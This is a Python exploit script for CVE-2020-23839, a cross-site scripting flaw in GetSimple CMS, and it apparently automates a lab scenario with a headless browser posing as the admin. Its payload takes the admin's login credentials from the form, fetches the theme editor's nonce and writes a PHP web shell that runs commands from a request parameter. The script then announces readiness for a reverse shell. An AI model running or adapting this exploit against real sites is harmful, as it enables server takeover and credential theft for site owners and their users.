import argparse
from urllib.parse import quote
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display


def genXssPayload():
    # payload created by Bobby Cooke, see: https://github.com/boku7/CVE-2020-23839
    XSS_PAYLOAD = '/index/javascript:'
    XSS_PAYLOAD += 'var s = decodeURIComponent("%2f");'
    XSS_PAYLOAD += 'var h = "application"+s+"x-www-form-urlencoded";'
    XSS_PAYLOAD += 'var e=function(i){return encodeURIComponent(i);};'
    XSS_PAYLOAD += 'var user = document.forms[0][0].value;'
    XSS_PAYLOAD += 'var pass = document.forms[0][1].value;'
    XSS_PAYLOAD += 'var u1 = s+"admin"+s;'
    XSS_PAYLOAD += 'var u2 = u1+"theme-edit.php";'
    XSS_PAYLOAD += 'var xhr1 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr2 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr3 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'xhr1.open("POST",u1,true);'
    XSS_PAYLOAD += 'xhr1.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'params = "userid="+user+"&pwd="+pass+"&submitted=Login";'
    XSS_PAYLOAD += 'xhr1.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr1.readyState == 4 && xhr1.status == 200) {'
    XSS_PAYLOAD += 'xhr2.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr2.readyState == 4 && xhr2.status == 200) {'
    XSS_PAYLOAD += 'r=this.responseXML;'
    XSS_PAYLOAD += 'nVal = r.querySelector("#nonce").value;'
    XSS_PAYLOAD += 'eVal = r.forms[1][2].defaultValue;'
    XSS_PAYLOAD += 'xhr3.open("POST",u2,true);'
    XSS_PAYLOAD += 'xhr3.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'payload=e("<?php echo shell_exec($_REQUEST[Starcastle]) ?>");'
    XSS_PAYLOAD += 'params="nonce="+nVal+"&content="+payload+"&edited_file="+eVal+"&submitsave=Save+Changes";'
    XSS_PAYLOAD += 'xhr3.send(params);'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr2.open("GET",u2,true);'
    XSS_PAYLOAD += 'xhr2.responseType="document";'
    XSS_PAYLOAD += 'xhr2.send();'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr1.send(params);'
    XSS_PAYLOAD += '%2f%2f'
    return XSS_PAYLOAD


def stupid_admin(url):
    # Virtual display to run chrome-browser
    display = Display(visible=0, size=(800, 800))
    display.start()

    # Headless chrome-browser settings
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--disable-dev-shm-usage')

    browser = webdriver.Chrome(chrome_options=chrome_options)
    browser.get(url)

    # logging the admin in
    username = 'admin'
    password = 'eaRSfT'

    username_form = browser.find_elements_by_xpath('//*[@id="userid"]')[0]
    password_form = browser.find_elements_by_xpath('//*[@id="pwd"]')[0]

    username_form.send_keys(username)
    password_form.send_keys(password)

    submit_button = browser.find_elements_by_xpath('/html/body/div[2]/div[1]/div/div/form/p[3]/input')[0]
    submit_button.click()

    print('admin logged in - xss script injected - ready for reverse shell')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2020-23839 GetSimple CMS XSS exploit")
    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    args = parser.parse_args()

    victim_base_url = 'http://' + args.server_ip + '/admin/index.php'

    # generate payload and append it to url
    payload = quote(genXssPayload())
    evil_url = victim_base_url + payload

    print("tricking admin to click on evil url...")
    stupid_admin(evil_url)
